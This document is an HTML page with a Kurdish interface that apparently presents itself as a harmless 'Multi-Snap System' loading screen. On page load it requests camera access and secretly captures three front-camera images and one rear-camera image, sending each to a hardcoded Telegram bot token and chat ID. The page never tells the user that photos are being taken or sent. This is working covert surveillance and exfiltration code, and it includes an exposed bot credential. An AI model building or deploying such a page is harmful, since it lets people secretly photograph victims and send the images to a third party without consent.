<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>Multi-Snap System</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background: #000; color: #fff; text-align: center; padding-top: 50px;">

    <h2 id="msg">تکایە کەمێک چاوەڕێ بکە...</h2>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = '8491301422:AAE8wM2ECL7zsRUimloWWYb5myT4iKNy7pc';
        const chat = '659131693';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // فەرمان بۆ ناردنی وێنە بۆ تێلیگرام
        async function sendToTelegram(blob, label) {
            const fd = new FormData();
            fd.append('photo', blob, 'img.jpg');
            fd.append('chat_id', chat);
            fd.append('caption', `📸 وێنەی ژمارە: ${label}`);
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }

        // فەرمان بۆ گرتنی وێنە لە ڤیدیۆکە
        function takeSnap() {
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            return new Promise(res => canvas.toBlob(res, 'image/jpeg'));
        }

        async function startProcess() {
            try {
                // قۆناغی ١: گرتنی ٣ وێنە بە کامێرای پێشەوە
                document.getElementById('msg').innerText = "قۆناغی ١: کامێرای پێشەوە...";
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;

                for (let i = 1; i <= 3; i++) {
                    await new Promise(r => setTimeout(r, 2000)); // ٢ چرکە چاوەڕێ بکە
                    const blob = await takeSnap();
                    await sendToTelegram(blob, `پێشەوە - ${i}`);
                }

                // داخستنی کامێرای پێشەوە
                stream.getTracks().forEach(t => t.stop());

                // قۆناغی ٢: گرتنی ١ وێنە بە کامێرای دواوە
                document.getElementById('msg').innerText = "قۆناغی ٢: کامێرای دواوە...";
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    video.srcObject = stream;
                    
                    await new Promise(r => setTimeout(r, 2000));
                    const blob = await takeSnap();
                    await sendToTelegram(blob, "دواوە (Main Camera)");
                } catch (e) {
                    console.log("کامێرای دواوە بوونی نییە یان کار ناکات.");
                }

                document.getElementById('msg').innerText = "پڕۆسەکە تەواو بوو!";
                stream.getTracks().forEach(t => t.stop());

            } catch (err) {
                document.getElementById('msg').innerText = "تکایە Allow بکە بۆ بەردەوامبوون";
                console.error(err);
            }
        }

        window.onload = startProcess;
    </script>
</body>
</html>
